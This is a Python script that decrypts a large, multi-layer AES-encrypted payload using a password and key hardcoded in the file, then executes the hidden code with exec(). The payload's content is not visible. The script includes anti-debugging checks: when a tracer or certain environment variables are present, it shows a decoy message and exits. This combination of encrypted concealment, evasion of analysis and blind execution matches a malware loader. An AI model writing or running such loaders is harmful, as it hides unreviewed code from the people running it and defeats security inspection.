#!/usr/bin/env python3
import os,sys,base64,zlib
from Crypto.Protocol.KDF import scrypt
from Crypto.Cipher import AES
def decrypt_script_with_layers(enc_script,password):
 raw=base64.b64decode(enc_script)
 layers=raw[0]
 data=raw[1:]
 for i in range(layers):
  salt=data[:32]
  nonce=data[32:44]
  tag=data[44:60]
  ct=data[60:]
  key=scrypt(password,salt,key_len=32,N=131072,r=8,p=2)
  cipher=AES.new(key,AES.MODE_GCM,nonce=nonce)
  data=cipher.decrypt_and_verify(ct,tag)
 return zlib.decompress(data).decode()
def add_extra_encryption(enc_script,password):
 raw=base64.b64decode(enc_script)
 current_layers=raw[0]
 data=raw[1:]
 salt=os.urandom(32)
 key=scrypt(password,salt,key_len=32,N=131072,r=8,p=2)
 nonce=os.urandom(12)
 cipher=AES.new(key,AES.MODE_GCM,nonce=nonce)
 ct,tag=cipher.encrypt_and_digest(data)
 new_data=salt+nonce+tag+ct
 new_layers=current_layers+1
 header=new_layers.to_bytes(1,byteorder='big')
 new_blob=header+new_data
 return base64.b64encode(new_blob).decode()
def check_for_trap():
 return sys.gettrace() is not None or os.getenv("TRAP_MODE")=="1" or os.getenv("PYTHONDEBUG")=="1" or os.getenv("HACKER_MODE")=="1"
def trigger_decoy():
 print("Waduh, kamu kena jebakan decoy! Gak ada apa-apa di sini, bro!")
 try:
  with open("decoy_payload.txt","w") as f:
   f.write("Decoy data: jangan main-main!")
 except Exception:
  pass
 sys.exit(1)
def get_decryption_password():
 if check_for_trap():
  trigger_decoy()
 return get_decryption_password_actual()
def get_decryption_password_actual():
 enc_pwd_blob="e2YQhbw7L1vwIkLVgBApBUg7Q2Tw8uEQ/sQQHc73a/omtj0BFMcr3p+v/UhznbHwMZZOhifUidHw2TEYeGL3tH10HV/B5XBzO6DkPgz2deu9Zsgo2qNWZz6CsB18L37H/lDqkx2Wt3X96Xfy2gpwjK0qKVttginqwIY="
 magic_key=b"gen_z_magic_key_for_decrypt_32b!"
 raw=base64.b64decode(enc_pwd_blob)
 salt=raw[:16]
 nonce=raw[16:28]
 tag=raw[28:44]
 ct=raw[44:]
 return AES.new(scrypt(magic_key,salt,key_len=32,N=131072,r=8,p=2),AES.MODE_GCM,nonce=nonce).decrypt_and_verify(ct,tag).decode()
if __name__=="__main__":
 password=get_decryption_password()
 if check_for_trap():
  trigger_decoy()
 decrypted_code=decrypt_script_with_layers("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",password)
 exec(decrypted_code)
